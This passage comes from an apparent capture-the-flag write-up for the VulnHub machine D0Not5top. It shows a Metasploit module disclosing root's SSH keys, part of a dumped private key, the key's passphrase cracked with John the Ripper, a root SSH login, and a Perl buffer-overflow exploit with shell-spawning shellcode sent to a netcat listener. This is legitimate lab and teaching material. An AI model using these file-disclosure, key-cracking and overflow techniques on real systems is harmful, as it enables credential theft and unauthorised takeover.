m9dlGgzfNF46yPCuHzBZt4q1wrzg5/7gcWx5Qq6xD5VtWiMlB4G3D8DruaeqgTOi
Sh/jFqEOErA015Ympz/0Hh/lFn0NAAJy89BPG86d+VVAn5YstQEqH6zzuIy9mZ9K
853+0BUxA0I9rEessa+Q+NlFadBVE2FcJAr7rMsLGZFoqfvWxg5hBJFJ7jrjpQNe
Q9qzA/CbiMeU+zdifXZwprJR1fNVWalPJJGwotwVgXN/z4s8iN1gMN9y4Kynue9k
zQ/HqvgTkyX52ojLnM/PkXCyx7EXBAOJi5s6fv/22kcZ5Xkpw+x/VILPnJqObmU9
RZ3IB6kbckiMld5GX+xMvYi9rvmHf/mdLj75e7PU+FjCufApXAi+T10PnvMvrCGS
FkSlVyPPo1s4klTdrf2l6tkK6Lqu/7SamkvQvMsY7wnNT4OPI95y3GoRnwEFLd7w
honOroF1U6leA5O8jxSxI/CIwxvb5DO/sX4bZxShlhD98yO74ImAg5ACTj/eUaVA
/Q7bpfasSnqdKNWhx81pD6Ee9WeBZv8c0I0/EqS188O1qFYbtsaqZhYytTqYwvZ0
p6QuusMnDaA1nB8wL7ltKXt5PhBBxSVbUKtP6DWcBRviItFTsAnmK1QhD2wmTkCu
B8ochgwCgtAUs4cUXxnZrp5pu2yvu8Dhf//z8lBtoItPh5LTmW1N1g4s+9NKt72P
-----END RSA PRIVATE KEY-----
[*] Auxiliary module execution completed
msf auxiliary(file_disclosure) > set rpath /root/.ssh/id_rsa.pub
rpath => /root/.ssh/id_rsa.pub
msf auxiliary(file_disclosure) > exploit

[*] Attempting to retrieve /root/.ssh/id_rsa.pub...
[*] The server returned: 200 Document follows
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPKVt8KEVrr80LT9ZwRsWG8w9O2vgWd99+2+xmi3WCgCR/IrhqoJqEhX9owwiaUUnyRWrj9AKDj8Neetju9rOCTJsvWAlfFgyrRXkOV9twpLcrML+LC5GsVGLH7U/R2sTpT9Ywad0yL+FTvHZ+AbYLFpml4Gbhat6Ynhcg3Q6XmxGHXkV9cd6/XCx74K8CKEtOye1REj8KDtsC329qvbp/9Dt1ZZQEAUFvLqgLJiZxmH5snWiszcO2TKQ3lUw3tLy5rA/bXe3Bf4zuEmktEuA0NW+FTLYELrBy/5PK007Uh0CQVpVS5C+tkLtqh6meAXPp7dhi/B6qGOIXpPxjpUjH root@D0Not5top
[*] Auxiliary module execution completed
{% endhighlight %}

<p>Now, let's save the <b>ssh keys</b> into the coresponding files called <b>id_rsa</b> and <b>id_rsa.pub</b>. Now, crack them.  </p>

{% highlight bash %}
root@kali:~# ssh2john id_rsa > pass
root@kali:~# john --wordlist:/usr/share/wordlists/rockyou.txt pass
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
gustateamo       (id_rsa)
1g 0:00:01:09 DONE (2017-06-09 15:14) 0.01432g/s 110970p/s 110970c/s 110970C/s gustateamo
Use the "--show" option to display all of the cracked passwords reliably
Session completed
{% endhighlight %}

<p>Just as 'easy' as it looks. We're ready to log in and get the final flag. </p>

{% highlight bash %}
root@kali:~# chmod 700 id_rsa
root@kali:~# ssh -i id_rsa root@10.0.2.8

root@D0Not5top:~# ls
FL461N51D3  L45T_fl46.pl
{% endhighlight %}

<p>Remember the <b>L45T_fl46.pl</b>? It was in the header of the first website, that we visited in this machine. Let's view it. </p>

{% highlight perl %}
#!/usr/bin/perl -w
######################################################
#                                                    #
#  W311 D0n3                                         #
#  Y0u D1d N0t5top                                   #
#  Much0 M3Gu5t4 :D                                  #
#                                                    #
#  3mrgnc3                                           #
#                                                    #
#  Hope you had fun...                               #
#  8ut...                                            #
#                                                    #
#  p.s..                                             #
#  571ll 1 M0r3 f146 :D                              #
#                                                    #
######################################################


use IO::Socket;

if(!($ARGV[1]))
{
 print "Usage: L45T_fl46.pl <user> <flag>\n\n";
 exit;
}

$shellcode =	"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f" .
                "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38" .
                "\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37" .
                "\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77" .
                "\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69" .
                "\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74" .
                "\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80" .
                "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f" .
                "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38" .
                "\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37" .
                "\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77" .
                "\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69" .
                "\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74" .
                "\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80" .
                "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f" .
                "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38" .
                "\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37" .
                "\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77" .
                "\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69" .
                "\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74" .
                "\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80" .
                "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f" .
                "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38" .
                "\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37" .
                "\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77" .
                "\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69" .
                "\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74" .
                "\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80" .
                "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f" .
                "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38" .
                "\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37" .
                "\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77" .
                "\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69" .
                "\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74" .
                "\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80" .
                "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f" .
                "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x2d" .
                "\x00\x00\x00\x4e\x33\x76\x33\x72\x20\x41\x73\x35\x75" .
                "\x6d\x33\x21\x20\x31\x74\x20\x4d\x34\x6b\x33\x35\x20" .
                "\x34\x6e\x20\x34\x35\x35\x20\x30\x66\x20\x79\x30\x75" .
                "\x20\x26\x20\x6d\x33\x20\x3a\x44\x00\x57\x53\x89\xe1" .
                "\xcd\x80" ;

$root = IO::Socket::INET->new(Proto=>'tcp',
                                PeerAddr=>$ARGV[0],
                                PeerPort=>$ARGV[1])
                            or die "Unable to use [$ARGV[0]] to open [$ARGV[1]]";
$ebp = "TROLLOOOLLO";
$eip = "\xBA\xDF\x00\xD0";
$flag7 = "RUN /" . "a"x1036 . $ebp . $eip . $shellcode . " HTTTPEE/1.1\n\n";

print $root $flag7;
sleep(5);
print "Done.\n";

close($root);
exit;

{% endhighlight %}

<p>Last step is to prepare the listener, then we are able to run the exploit. </p>

{% highlight bash %}
root@D0Not5top:~# ./L45T_fl46.pl 10.0.2.15 6666
Done.
root@D0Not5top:~#

root@kali:~# nc -lp 6666
RUN /aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaTROLLOOOLLO���j
                X�Rfh-c��h/shh/bin��R�8YAY FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk 2>/tmp/huhWS��̀j
                   X�Rfh-c��h/shh/bin��R�8YAY FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk 2>/tmp/huhWS��̀j
                      X�Rfh-c��h/shh/bin��R�8YAY FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk 2>/tmp/huhWS��̀j
                         X�Rfh-c��h/shh/bin��R�8YAY FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk 2>/tmp/huhWS��̀j
                            X�Rfh-c��h/shh/bin��R�8YAY FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk 2>/tmp/huhWS��̀j
                               X�Rfh-c��h/shh/bin��R�-N3v3r As5um3! 1t M4k35 4n 455 0f y0u & m3 :DWS��̀ HTTTPEE/1.1

{% endhighlight %}

<p>We have the last flag! </p>

<h1>Last words</h1>

<p>It was really frustrating, long and amazingly fun machine. I really enjoyed solving the challenges, even though they were taking me a lot of time and few headaches. Thanks a lot to <a href="https://3mrgnc3.ninja/"><b>3mrgnc3</b></a> for creating this challenge, and to <a href="https://www.vulnhub.com/"><b>Vulnhub</b></a>, for hosting it. Hope you had fun reading this, and as always... </p>

<p>~ Stay safe!</p>
